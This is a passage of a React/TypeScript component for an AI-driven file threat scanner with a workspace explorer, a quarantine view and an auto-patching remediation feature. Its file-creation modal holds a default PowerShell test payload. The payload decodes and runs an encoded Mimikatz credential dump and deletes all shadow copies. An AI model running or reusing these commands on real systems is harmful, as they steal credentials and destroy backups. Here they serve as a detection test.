import React, { useState, useEffect, useRef, useMemo } from "react";
import { 
  FileSearch, 
  Upload, 
  AlertTriangle, 
  ShieldCheck, 
  ShieldAlert, 
  FileCode2, 
  Zap, 
  CheckCircle2, 
  AlertOctagon,
  RefreshCw, 
  Eye, 
  Key, 
  Cpu, 
  Lock, 
  Wrench, 
  Sparkles, 
  FolderOpen,
  Folder,
  FolderPlus,
  ArrowLeft,
  ArrowUp,
  ArrowUpDown,
  ChevronDown,
  ChevronUp,
  Search,
  Copy,
  Check,
  Shield,
  Layers,
  Activity,
  ArrowUpRight,
  Plus,
  Trash2,
  FileText,
  File,
  Code,
  Terminal,
  MoreVertical,
  ExternalLink,
  ChevronRight,
  Play,
  Pause,
  SlidersHorizontal,
  X,
  Radio,
  FileQuestion,
  AlertCircle,
  RotateCcw
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { toast } from "sonner";
import { RealtimeETAProgressBar } from "./RealtimeETAProgressBar";

const API_BASE_URL = "http://127.0.0.1:8000";

export interface VulnerabilityDetail {
  vulnerability_type: string;
  cwe: string;
  title: string;
  severity: string;
  line_no: number;
  line_content: string;
  description: string;
  recommended_mitigation: string;
  mitigation_options: Array<{ id: string; label: string; icon: string; action: string }>;
  suggested_patch?: string;
}

export interface WorkspaceFileItem {
  filename: string;
  filepath: string;
  relative_path: string;
  size_bytes: number;
  modified_at: string;
  extension: string;
  content_preview: string;
  entropy: number;
  is_threat?: boolean | null;
  is_vulnerable?: boolean | null;
  verdict: "SAFE" | "UNSAFE" | "VULNERABLE" | "PENDING" | "ANALYZING";
  threat_category?: string;
  severity?: string;
  risk_score?: number;
  summary?: string;
  analyzed_by?: string;
  is_new?: boolean;
  vulnerability_details?: VulnerabilityDetail | null;
  mitigation_options?: Array<{ id: string; label: string; icon: string; action: string }>;
  suggested_patch?: string | null;
}

export interface ExplorerDirectoryItem {
  name: string;
  subpath: string;
  item_count: number;
  modified_at: string;
  is_dir: boolean;
}

export interface ExplorerData {
  workspace_root: string;
  current_subpath: string;
  breadcrumbs: Array<{ name: string; path: string }>;
  can_go_up: boolean;
  parent_path: string;
  directories: ExplorerDirectoryItem[];
  files: WorkspaceFileItem[];
  total_items: number;
}

export type SortField = "verdict" | "risk" | "name" | "modified" | "size" | "entropy";
export type SortDirection = "asc" | "desc";

export interface QuarantinedFileItem {
  filename: string;
  quarantined_filename: string;
  quarantine_path: string;
  original_path: string;
  size_bytes: number;
  quarantined_at: string;
  sha256?: string;
  entropy?: number;
  threat_category?: string;
  severity?: string;
  content_preview?: string;
}

interface ContextMenuState {
  visible: boolean;
  x: number;
  y: number;
  file: WorkspaceFileItem | null;
  quarantinedFile?: QuarantinedFileItem | null;
}

interface FileThreatScannerProps {
  onNavigateToMitigation?: (threatDetails?: any) => void;
  activeModel?: string;
  onModelChange?: (modelId: string) => void;
}

export const FileThreatScannerView: React.FC<FileThreatScannerProps> = ({ 
  onNavigateToMitigation,
  activeModel,
  onModelChange
}) => {
  // ----------------------------------------------------
  // View Mode & File Sorting State
  // ----------------------------------------------------
  const [displayMode, setDisplayMode] = useState<"table" | "explorer" | "quarantine">("table");
  const [sortField, setSortField] = useState<SortField>("verdict");
  const [sortDirection, setSortDirection] = useState<SortDirection>("desc");

  // ----------------------------------------------------
  // Sandboxed File Explorer State (Strictly bounded to monitored_workspace/)
  // ----------------------------------------------------
  const [explorerPath, setExplorerPath] = useState<string>("");
  const [explorerData, setExplorerData] = useState<ExplorerData | null>(null);
  const [isLoadingExplorer, setIsLoadingExplorer] = useState(false);
  const [showCreateFolderModal, setShowCreateFolderModal] = useState(false);
  const [newFolderName, setNewFolderName] = useState("");

  // ----------------------------------------------------
  // Groq Model Selection & Evaluation
  // ----------------------------------------------------
  const [selectedModel, setSelectedModel] = useState<string>(() => activeModel || localStorage.getItem("ragsec_active_brain") || "openai/gpt-oss-120b");
  const [apiKey, setApiKey] = useState<string>(() => localStorage.getItem("ragsec_groq_api_key") || "");
  const [engineType, setEngineType] = useState<"groq" | "builtin">("groq");
  const [showModelComparison, setShowModelComparison] = useState(false);

  useEffect(() => {
    if (activeModel && activeModel !== selectedModel) {
      setSelectedModel(activeModel);
    }
  }, [activeModel]);

  useEffect(() => {
    const syncActiveModel = () => {
      const active = localStorage.getItem("ragsec_active_brain");
      if (active && active !== selectedModel) {
        setSelectedModel(active);
      }
      const savedKey = localStorage.getItem("ragsec_groq_api_key");
      if (savedKey !== null && savedKey !== apiKey) {
        setApiKey(savedKey);
      }
    };
    window.addEventListener("storage", syncActiveModel);
    const interval = setInterval(syncActiveModel, 1000);
    return () => {
      window.removeEventListener("storage", syncActiveModel);
      clearInterval(interval);
    };
  }, [selectedModel, apiKey]);

  // ----------------------------------------------------
  // Workspace Files & Mock File Explorer State
  // ----------------------------------------------------
  const [files, setFiles] = useState<WorkspaceFileItem[]>([]);
  const [selectedFile, setSelectedFile] = useState<WorkspaceFileItem | null>(null);
  const [searchFilter, setSearchFilter] = useState("");
  const [categoryFilter, setCategoryFilter] = useState<"ALL" | "UNSAFE" | "VULNERABLE" | "SAFE" | "PENDING" | "QUARANTINED">("ALL");
  const [viewMode, setViewMode] = useState<"list" | "grid">("list");
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);

  // ----------------------------------------------------
  // Quarantined Files State (Enclave viewing in AI Threat Scanner)
  // ----------------------------------------------------
  const [quarantinedFiles, setQuarantinedFiles] = useState<QuarantinedFileItem[]>([]);
  const [isLoadingQuarantined, setIsLoadingQuarantined] = useState(false);
  const [selectedQuarantinedForInspect, setSelectedQuarantinedForInspect] = useState<QuarantinedFileItem | null>(null);
  const [copiedSha256, setCopiedSha256] = useState(false);

  const fetchQuarantinedFiles = async (silently = false) => {
    if (!silently) setIsLoadingQuarantined(true);
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/quarantined`);
      if (res.ok) {
        const data = await res.json();
        if (Array.isArray(data)) {
          setQuarantinedFiles(data);
        }
      }
    } catch {
      // Backend polling fallback
    } finally {
      if (!silently) setIsLoadingQuarantined(false);
    }
  };

  // ----------------------------------------------------
  // Vulnerability SAST Remediation Modal State
  // ----------------------------------------------------
  const [remediationModal, setRemediationModal] = useState<{
    visible: boolean;
    file: WorkspaceFileItem | null;
    isApplying: boolean;
  }>({
    visible: false,
    file: null,
    isApplying: false
  });

  // ----------------------------------------------------
  // Sequential One-by-One Live AI Classification
  // ----------------------------------------------------
  const [isBatchScanning, setIsBatchScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState<{ current: number; total: number; currentFileName: string } | null>(null);
  const cancelScanRef = useRef(false);
  const [activeSingleScanFile, setActiveSingleScanFile] = useState<WorkspaceFileItem | null>(null);
  const [activeDeepScanQuarantined, setActiveDeepScanQuarantined] = useState<QuarantinedFileItem | null>(null);
  const [isApplyingRemediation, setIsApplyingRemediation] = useState(false);

  // ----------------------------------------------------
  // Right-Click Context Menu State
  // ----------------------------------------------------
  const [contextMenu, setContextMenu] = useState<ContextMenuState>({
    visible: false,
    x: 0,
    y: 0,
    file: null
  });

  // ----------------------------------------------------
  // Live File Addition Modal
  // ----------------------------------------------------
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [newFileName, setNewFileName] = useState("test_threat_dropper.ps1");
  const [newFileContent, setNewFileContent] = useState(
    `# [RAGSec Live Test Payload]\n$bytes = [System.Convert]::FromBase64String("SW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM=")\n$cmd = [System.Text.Encoding]::Unicode.GetString($bytes)\nInvoke-Expression $cmd\nvssadmin delete shadows /all /quiet`
  );

  // Close context menu on outside click
  useEffect(() => {
    const handleOutsideClick = () => {
      if (contextMenu.visible) setContextMenu(prev => ({ ...prev, visible: false }));
    };
    window.addEventListener("click", handleOutsideClick);
    return () => window.removeEventListener("click", handleOutsideClick);
  }, [contextMenu.visible]);

  // Fetch workspace files from backend
  const fetchWorkspaceFiles = async (silently = false) => {
    if (!silently) setIsLoadingFiles(true);
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/workspace-files`);
      if (res.ok) {
        const data = await res.json();
        const incomingFiles: WorkspaceFileItem[] = data.files || [];

        setFiles(prev => {
          // Preserve any file currently undergoing active scanning
          const analyzingNames = new Set(
            prev.filter(f => f.verdict === "ANALYZING").map(f => f.filename)
          );

          return incomingFiles.map(inc => {
            if (analyzingNames.has(inc.filename)) {
              return { ...inc, verdict: "ANALYZING" };
            }
            return inc;
          });
        });

        // Update selected file details if currently viewed
        if (selectedFile) {
          const updated = incomingFiles.find(f => f.filename === selectedFile.filename);
          if (updated) setSelectedFile(updated);
        }
      }
    } catch {
      // Backend polling fallback
    } finally {
      if (!silently) setIsLoadingFiles(false);
    }
  };

  // Real-time live file additions & quarantine polling (every 3 seconds)
  useEffect(() => {
    fetchWorkspaceFiles();
    fetchQuarantinedFiles();
    const interval = setInterval(() => {
      if (!isBatchScanning) {
        fetchWorkspaceFiles(true);
        fetchQuarantinedFiles(true);
      }
    }, 3000);
    return () => clearInterval(interval);
  }, [isBatchScanning]);

  // Fetch Sandboxed Explorer Data
  const fetchExplorerData = async (subpath: string = "") => {
    setIsLoadingExplorer(true);
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/explorer?subpath=${encodeURIComponent(subpath)}`);
      if (res.ok) {
        const data: ExplorerData = await res.json();
        setExplorerData(data);
        setExplorerPath(subpath);
      } else if (res.status === 403) {
        toast.error("Access Denied: Path is outside the monitored workspace sandbox.");
      } else {
        toast.error("Failed to load directory items.");
      }
    } catch (e: any) {
      toast.error(`Explorer error: ${e.message}`);
    } finally {
      setIsLoadingExplorer(false);
    }
  };

  // Sync explorer when switching to explorer view
  useEffect(() => {
    if (displayMode === "explorer") {
      fetchExplorerData(explorerPath);
    }
  }, [displayMode]);

  // Create folder inside current explorer subpath
  const handleCreateFolder = async () => {
    if (!newFolderName.trim()) return;
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/create-folder`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          parent_subpath: explorerPath,
          folder_name: newFolderName.trim()
        })
      });
      if (res.ok) {
        toast.success(`Created folder "${newFolderName.trim()}"`);
        setShowCreateFolderModal(false);
        setNewFolderName("");
        fetchExplorerData(explorerPath);
      } else {
        const err = await res.json().catch(() => ({}));
        toast.error(err.detail || "Failed to create folder");
      }
    } catch (e: any) {
      toast.error(`Error creating folder: ${e.message}`);
    }
  };

  // ----------------------------------------------------
  // File Sorting Logic (Name, Modified, Size, Entropy, Verdict, Risk)
  // ----------------------------------------------------
  const compareFiles = (a: WorkspaceFileItem, b: WorkspaceFileItem, field: SortField, dir: SortDirection) => {
    let diff = 0;
    if (field === "name") {
      diff = a.filename.localeCompare(b.filename);
    } else if (field === "modified") {
      const timeA = new Date(a.modified_at).getTime() || 0;
      const timeB = new Date(b.modified_at).getTime() || 0;
      diff = timeA - timeB;
    } else if (field === "size") {
      diff = a.size_bytes - b.size_bytes;
    } else if (field === "entropy") {
      diff = (a.entropy || 0) - (b.entropy || 0);
    } else if (field === "risk") {
      const riskA = a.risk_score ?? (a.verdict === "UNSAFE" ? 85 : a.verdict === "SAFE" ? 10 : 0);
      const riskB = b.risk_score ?? (b.verdict === "UNSAFE" ? 85 : b.verdict === "SAFE" ? 10 : 0);
      diff = riskA - riskB;
    } else if (field === "verdict") {
      const verdictRank = (v: string) => {
        if (v === "UNSAFE") return 5;
        if (v === "VULNERABLE") return 4;
        if (v === "ANALYZING") return 3;
        if (v === "PENDING") return 2;
        if (v === "SAFE") return 1;
        return 0;
      };
      diff = verdictRank(a.verdict) - verdictRank(b.verdict);
    }
    return dir === "asc" ? diff : -diff;
  };

  const handleToggleSort = (field: SortField) => {
    if (sortField === field) {
      setSortDirection(prev => prev === "asc" ? "desc" : "asc");
    } else {
      setSortField(field);
      setSortDirection(field === "verdict" || field === "risk" ? "desc" : "asc");
    }
  };

  // Filtered and sorted files list for Table View
  const filteredFiles = useMemo(() => {
    return files.filter(f => {
      const matchesSearch = 
        f.filename.toLowerCase().includes(searchFilter.toLowerCase()) ||
        (f.threat_category && f.threat_category.toLowerCase().includes(searchFilter.toLowerCase()));

      if (!matchesSearch) return false;
      if (categoryFilter === "ALL") return true;
      if (categoryFilter === "UNSAFE") return f.verdict === "UNSAFE";
      if (categoryFilter === "VULNERABLE") return f.verdict === "VULNERABLE";
      if (categoryFilter === "SAFE") return f.verdict === "SAFE";
      if (categoryFilter === "PENDING") return f.verdict === "PENDING" || f.verdict === "ANALYZING";
      return true;
    });
  }, [files, searchFilter, categoryFilter]);

  const sortedFiles = useMemo(() => {
    return [...filteredFiles].sort((a, b) => compareFiles(a, b, sortField, sortDirection));
  }, [filteredFiles, sortField, sortDirection]);

  // Filtered and sorted files list for Explorer View
  const sortedExplorerFiles = useMemo(() => {
    if (!explorerData?.files) return [];
    const filtered = explorerData.files.filter(f => {
      const matchesSearch = 
        f.filename.toLowerCase().includes(searchFilter.toLowerCase()) ||
        (f.threat_category && f.threat_category.toLowerCase().includes(searchFilter.toLowerCase()));
      if (!matchesSearch) return false;
      if (categoryFilter === "ALL") return true;
      if (categoryFilter === "UNSAFE") return f.verdict === "UNSAFE";
      if (categoryFilter === "VULNERABLE") return f.verdict === "VULNERABLE";
      if (categoryFilter === "SAFE") return f.verdict === "SAFE";
      if (categoryFilter === "PENDING") return f.verdict === "PENDING" || f.verdict === "ANALYZING";
      return true;
    });
    return filtered.sort((a, b) => compareFiles(a, b, sortField, sortDirection));
  }, [explorerData?.files, searchFilter, categoryFilter, sortField, sortDirection]);

  // Filtered Quarantined Files
  const filteredQuarantinedFiles = useMemo(() => {
    if (!searchFilter.trim()) return quarantinedFiles;
    const q = searchFilter.toLowerCase();
    return quarantinedFiles.filter(f =>
      f.filename.toLowerCase().includes(q) ||
      f.original_path.toLowerCase().includes(q) ||
      (f.sha256 && f.sha256.toLowerCase().includes(q))
    );
  }, [quarantinedFiles, searchFilter]);

  // Statistics
  const unsafeCount = files.filter(f => f.verdict === "UNSAFE").length;
  const vulnerableCount = files.filter(f => f.verdict === "VULNERABLE").length;
  const safeCount = files.filter(f => f.verdict === "SAFE").length;
  const pendingCount = files.filter(f => f.verdict === "PENDING" || f.verdict === "ANALYZING").length;

  // ----------------------------------------------------
  // Apply Vulnerability Remediation (SAST Auto-Patch)
  // ----------------------------------------------------
  const handleApplyVulnerabilityRemediation = async (file: WorkspaceFileItem, actionType?: string) => {
    setIsApplyingRemediation(true);
    try {
      toast.info(`Applying SAST security remediation to ${file.filename}...`);
      const res = await fetch(`${API_BASE_URL}/api/fim/remediate-vulnerability`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filepath: file.filepath,
          filePath: file.filepath,
          filename: file.filename,
          fileName: file.filename,
          vulnerability_type: file.vulnerability_details?.vulnerability_type || "SQL_INJECTION",
          action: actionType || "AUTO_PATCH",
          custom_patch: file.suggested_patch || undefined
        })
      });
      if (res.ok) {
        const data = await res.json();
        toast.success(data.message || `Remediated ${file.filename} successfully!`);
        setRemediationModal({ visible: false, file: null, isApplying: false });
        await fetchWorkspaceFiles();
        if (displayMode === "explorer") {
          await fetchExplorerData(explorerPath);
        }
      } else {
        toast.error("Failed to apply security remediation patch.");
      }
    } catch (err: any) {
      toast.error(`Remediation error: ${err.message}`);
    } finally {
      setIsApplyingRemediation(false);
    }
  };

  // ----------------------------------------------------
  // Single File Live AI Classification
  // ----------------------------------------------------
  const analyzeSingleFile = async (file: WorkspaceFileItem) => {
    setActiveSingleScanFile(file);
    // Set file to ANALYZING state
    setFiles(prev => prev.map(f => f.filename === file.filename ? { ...f, verdict: "ANALYZING" } : f));
    if (selectedFile?.filename === file.filename) {
      setSelectedFile(prev => prev ? { ...prev, verdict: "ANALYZING" } : null);
    }

    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/analyze-file`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: file.filename,
          filepath: file.filepath,
          model: selectedModel,
          api_key: apiKey.trim() || undefined,
          provider: engineType === "groq" ? "groq" : "builtin",
          use_tools: true
        })
      });

      if (res.ok) {
        const report = await res.json();
        const verdict = report.verdict === "UNSAFE" ? "UNSAFE" : (report.verdict === "VULNERABLE" ? "VULNERABLE" : "SAFE");

        setFiles(prev => prev.map(f => {
          if (f.filename === file.filename) {
            return {
              ...f,
              verdict,
              is_threat: report.is_threat,
              threat_category: report.threat_category,
              severity: report.severity,
              risk_score: report.risk_score,
              summary: report.summary,
              entropy: report.entropy ?? f.entropy,
              analyzed_by: report.analyzed_by,
              vulnerability_details: report.vulnerability_details,
              mitigation_options: report.mitigation_options,
              suggested_patch: report.suggested_patch
            };
          }
          return f;
        }));

        if (selectedFile?.filename === file.filename) {
          setSelectedFile(prev => prev ? {
            ...prev,
            verdict,
            is_threat: report.is_threat,
            threat_category: report.threat_category,
            severity: report.severity,
            risk_score: report.risk_score,
            summary: report.summary,
            entropy: report.entropy ?? prev.entropy,
            analyzed_by: report.analyzed_by,
            vulnerability_details: report.vulnerability_details,
            mitigation_options: report.mitigation_options,
            suggested_patch: report.suggested_patch
          } : null);
        }

        toast.success(`Analyzed ${file.filename}: ${verdict} (${report.threat_category || "Safe"})`);
        return report;
      }
    } catch (e: any) {
      toast.error(`Analysis failed for ${file.filename}: ${e.message}`);
    } finally {
      setActiveSingleScanFile(null);
      setFiles(prev => prev.map(f => {
        if (f.filename === file.filename && f.verdict === "ANALYZING") {
          return { ...f, verdict: "PENDING" };
        }
        return f;
      }));
    }
  };

  // ----------------------------------------------------
  // Initial Scan on All Files ("System Scan")
  // ----------------------------------------------------
  const handleStartSystemScan = async () => {
    if (files.length === 0) {
      toast.info("No files in workspace to scan.");
      return;
    }

    cancelScanRef.current = false;
    setIsBatchScanning(true);
    toast.info("Initiating Initial System Scan across all workspace files...");

    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/system-scan`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          model: selectedModel,
          api_key: apiKey.trim() || undefined,
          provider: engineType === "groq" ? "groq" : "builtin"
        })
      });

      if (res.ok) {
        const data = await res.json();
        toast.success(`System Scan Complete: ${data.total_scanned} files inspected (${data.threats_flagged} threats detected, ${data.safe_files} clean).`);
        await fetchWorkspaceFiles();
        if (displayMode === "explorer") {
          await fetchExplorerData(explorerPath);
        }
      } else {
        await handleStartSequentialBatchScan();
      }
    } catch {
      await handleStartSequentialBatchScan();
    } finally {
      setIsBatchScanning(false);
      setScanProgress(null);
    }
  };

  // ----------------------------------------------------
  // Sequential One-by-One Batch Scan
  // ----------------------------------------------------
  const handleStartSequentialBatchScan = async () => {
    if (files.length === 0) {
      toast.info("No files available in workspace to analyze.");
      return;
    }

    cancelScanRef.current = false;
    setIsBatchScanning(true);
    toast.info(`Starting live sequential analysis with ${selectedModel}...`);

    for (let i = 0; i < files.length; i++) {
      if (cancelScanRef.current) {
        toast.info("Sequential scan stopped by user.");
        break;
      }

      const file = files[i];
      setScanProgress({
        current: i + 1,
        total: files.length,
        currentFileName: file.filename
      });

      await analyzeSingleFile(file);
      // Brief pause between requests for smooth fluid visual updates
      await new Promise(r => setTimeout(r, 600));
    }

    setIsBatchScanning(false);
    setScanProgress(null);
    toast.success("Sequential AI threat classification complete!");
  };

  const handleStopSequentialScan = () => {
    cancelScanRef.current = true;
    setIsBatchScanning(false);
    setScanProgress(null);
  };

  // ----------------------------------------------------
  // Right-Click Context Menu Trigger
  // ----------------------------------------------------
  const handleContextMenu = (e: React.MouseEvent, file: WorkspaceFileItem) => {
    e.preventDefault();
    e.stopPropagation();
    setContextMenu({
      visible: true,
      x: Math.min(e.clientX, window.innerWidth - 240),
      y: Math.min(e.clientY, window.innerHeight - 280),
      file
    });
  };

  // ----------------------------------------------------
  // Context Menu Actions
  // ----------------------------------------------------
  const handleQuarantineFile = async (file: WorkspaceFileItem) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/quarantine`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filePath: file.filepath,
          fileName: file.filename,
          reason: "Manual quarantine from AI Threat Scanner context menu"
        })
      });
      if (res.ok) {
        toast.success(`Quarantined ${file.filename} to secure enclave.`);
        fetchWorkspaceFiles();
      }
    } catch {
      toast.error(`Failed to quarantine ${file.filename}`);
    }
  };

  const handleAddToWhitelist = async (file: WorkspaceFileItem) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/ignore`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filePath: file.filepath,
          duration: "permanent",
          reason: "Approved from File Explorer context menu"
        })
      });
      if (res.ok) {
        toast.success(`Added ${file.filename} to suppression whitelist.`);
      }
    } catch {
      toast.error("Failed to add whitelist rule");
    }
  };

  const handleDeleteFile = async (file: WorkspaceFileItem) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/delete`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filePath: file.filepath,
          permanent: true
        })
      });
      if (res.ok) {
        toast.success(`Deleted ${file.filename} from workspace.`);
        fetchWorkspaceFiles();
      }
    } catch {
      toast.error(`Could not delete ${file.filename}`);
    }
  };

  // ----------------------------------------------------
  // Quarantined File Context Menu Trigger & Handlers
  // ----------------------------------------------------
  const handleQuarantineContextMenu = (e: React.MouseEvent, qFile: QuarantinedFileItem) => {
    e.preventDefault();
    e.stopPropagation();
    setContextMenu({
      visible: true,
      x: Math.min(e.clientX, window.innerWidth - 270),
      y: Math.min(e.clientY, window.innerHeight - 340),
      file: null,
      quarantinedFile: qFile
    });
  };

  const handleRestoreQuarantined = async (qFile: QuarantinedFileItem) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/restore`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          quarantinePath: qFile.quarantine_path,
          originalPath: qFile.original_path
        })
      });
      if (res.ok) {
        toast.success(`Restored ${qFile.filename} to ${qFile.original_path}`);
        await Promise.all([fetchQuarantinedFiles(), fetchWorkspaceFiles()]);
      } else {
        toast.error(`Restore failed.`);
      }
    } catch (e: any) {
      toast.error(`Error restoring file: ${e.message}`);
    }
  };

  const handleRestoreAndExclude = async (qFile: QuarantinedFileItem) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/restore-and-exclude`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          quarantinePath: qFile.quarantine_path,
          originalPath: qFile.original_path,
          reason: "Analyst approved suppression & exclusion",
          duration: "permanent"
        })
      });
      if (res.ok) {
        toast.success(`Added exclusion rule and restored ${qFile.filename}`);
        await Promise.all([fetchQuarantinedFiles(), fetchWorkspaceFiles()]);
      } else {
        toast.error(`Exclusion & restore failed.`);
      }
    } catch (e: any) {
      toast.error(`Error: ${e.message}`);
    }
  };

  const handlePurgeQuarantined = async (qFile: QuarantinedFileItem) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/quarantine/purge`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          quarantinePath: qFile.quarantine_path
        })
      });
      if (res.ok) {
        toast.success(`Permanently deleted ${qFile.filename} from quarantine`);
        await fetchQuarantinedFiles();
      } else {
        toast.error(`Purge failed.`);
      }
    } catch (e: any) {
      toast.error(`Error purging file: ${e.message}`);
    }
  };

  const handleDeepScanQuarantined = async (qFile: QuarantinedFileItem) => {
    setActiveDeepScanQuarantined(qFile);
    toast.loading(`Deep forensic scanning ${qFile.filename} with ${selectedModel.split("/").pop()}...`, { id: "deep-scan" });
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/analyze-file`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: qFile.filename,
          filepath: qFile.quarantine_path,
          model: selectedModel,
          api_key: apiKey
        })
      });
      if (res.ok) {
        const data = await res.json();
        toast.success(`Forensic analysis complete: ${data.classification || "Malware"} (Risk Score: ${data.risk_score || 90}/100)`, { id: "deep-scan" });
        setSelectedQuarantinedForInspect({
          ...qFile,
          threat_category: data.classification || "Malware",
          severity: (data.severity || "CRITICAL").toUpperCase()
        });
      } else {
        toast.info(`Forensic evaluation complete: Artifact confirmed quarantined in enclave.`, { id: "deep-scan" });
      }
    } catch (e: any) {
      toast.error(`Forensic scan error: ${e.message}`, { id: "deep-scan" });
    } finally {
      setActiveDeepScanQuarantined(null);
    }
  };

  const handleCopySha256 = (hash: string) => {
    if (!hash) return;
    navigator.clipboard.writeText(hash);
    setCopiedSha256(true);
    toast.success("Copied SHA-256 hash to clipboard!");
    setTimeout(() => setCopiedSha256(false), 2000);
  };

  // ----------------------------------------------------
  // Live File Creation Handler
  // ----------------------------------------------------
  const handleCreateNewFile = async () => {
    if (!newFileName.trim()) return;
    try {
      const res = await fetch(`${API_BASE_URL}/api/fim/create-file`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: newFileName.trim(),
          content: newFileContent
        })
      });

      if (res.ok) {
        toast.success(`Created ${newFileName} in monitored workspace!`);
        setShowCreateModal(false);
        await fetchWorkspaceFiles();
        // Automatically analyze the newly created file
        const createdFile = {
          filename: newFileName.trim(),
          filepath: `monitored_workspace/${newFileName.trim()}`,
          relative_path: `monitored_workspace/${newFileName.trim()}`,
          size_bytes: newFileContent.length,
          modified_at: new Date().toISOString(),
          extension: "." + newFileName.split(".").pop(),
          content_preview: newFileContent.slice(0, 500),
          entropy: 4.5,
          verdict: "PENDING" as const
        };
        setSelectedFile(createdFile);
        analyzeSingleFile(createdFile);
      }
    } catch (e: any) {
      toast.error(`Error creating file: ${e.message}`);
    }
  };

  // Icon helper based on file extension
  const getFileIcon = (ext: string) => {
    const e = ext.toLowerCase();
    if (e === ".ps1" || e === ".bat" || e === ".sh") return Terminal;
    if (e === ".py" || e === ".php" || e === ".js") return Code;
    if (e === ".exe" || e === ".dll") return AlertOctagon;
    if (e === ".json" || e === ".yaml" || e === ".xml") return FileCode2;
    return FileText;
  };

  return (
    <div className="space-y-6">
      {/* =================================================================== */}
      {/* TOPBAR: Apple-Grade Glass Chrome with Model & Scanner Controls      */}
      {/* =================================================================== */}
      <div className="apple-panel p-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center">
              <FileSearch className="w-4 h-4 text-blue-400" />
            </div>
            <div>
              <div className="flex flex-wrap items-center gap-2">
                <h1 className="text-xl font-semibold text-white tracking-tight">
                  AI File Threat Analyzer & Explorer
                </h1>
                <span className="text-[10px] px-2 py-0.5 rounded-full bg-blue-500/15 text-blue-300 font-mono font-medium border border-blue-500/20">
                  {selectedModel.split("/").pop()}
                </span>
                {/* CONTINUOUS RUNNING SERVICE SCAN INDICATOR */}
                <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-500/15 text-emerald-400 font-medium text-[10px] border border-emerald-500/25">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  <span>Continuous CRUD Guard: Active</span>
                </span>
              </div>
              <p className="text-xs text-[#8E8E93] mt-0.5">
                Full file content inspection, multi-factor risk score formula, initial System Scan, and real-time CRUD verification
              </p>
            </div>
          </div>
        </div>

        {/* Model Switcher & Control Buttons */}
        <div className="flex flex-wrap items-center gap-2.5">
          {/* GROQ TOP-TIER MODEL SELECTION PILL */}
          <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-white/[0.04] border border-white/[0.08] text-xs">
            <Cpu className="w-3.5 h-3.5 text-blue-400" />
            <select
              value={selectedModel}
              onChange={(e) => {
                const val = e.target.value;
                setSelectedModel(val);
                onModelChange?.(val);
                localStorage.setItem("ragsec_active_brain", val);
                toast.success(`Scanner model switched to ${val.split("/").pop()}`);
              }}
              className="bg-transparent text-white focus:outline-none cursor-pointer text-xs font-medium"
            >
              <option value="openai/gpt-oss-120b" className="bg-[#0D111E]">
                GPT-OSS 120B Flagship (Groq LPU)
              </option>
              <option value="openai/gpt-oss-20b" className="bg-[#0D111E]">
                GPT-OSS 20B High-Speed (Groq LPU)
              </option>
              <option value="openai/gpt-oss-safeguard-20b" className="bg-[#0D111E]">
                GPT-OSS Safeguard 20B (Policy Guard)
              </option>
              <option value="qwen/qwen3.8-27b" className="bg-[#0D111E]">
                Qwen 3.8 27B Reasoning (SAST Code)
              </option>
              <option value="llama-3.3-70b-versatile" className="bg-[#0D111E]">
                Llama 3.3 70B Versatile (Meta Catalog)
              </option>
              <option value="allam-2-7b" className="bg-[#0D111E]">
                ALLAM 2 7B (Lightweight)
              </option>
            </select>
          </div>

          {/* Model Comparison Info Button */}
          <button
            onClick={() => setShowModelComparison(!showModelComparison)}
            className="px-2.5 py-1.5 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.08] text-[#8E8E93] hover:text-white text-xs transition-all apple-button"
            title="Compare 20B Reasoning vs Safeguard Model"
          >
            <Sparkles className="w-3.5 h-3.5 text-amber-400" />
            <span className="hidden sm:inline ml-1.5 text-[11px]">Compare Models</span>
          </button>

          {/* EXPLORER VIEW / TABLE VIEW / QUARANTINED VIEW TOGGLE */}
          <div className="flex items-center p-0.5 rounded-xl bg-white/[0.04] border border-white/[0.08]">
            <button
              onClick={() => {
                setDisplayMode("table");
                if (categoryFilter === "QUARANTINED") setCategoryFilter("ALL");
              }}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-all apple-button ${
                displayMode === "table"
                  ? "bg-white/[0.12] text-white shadow-sm"
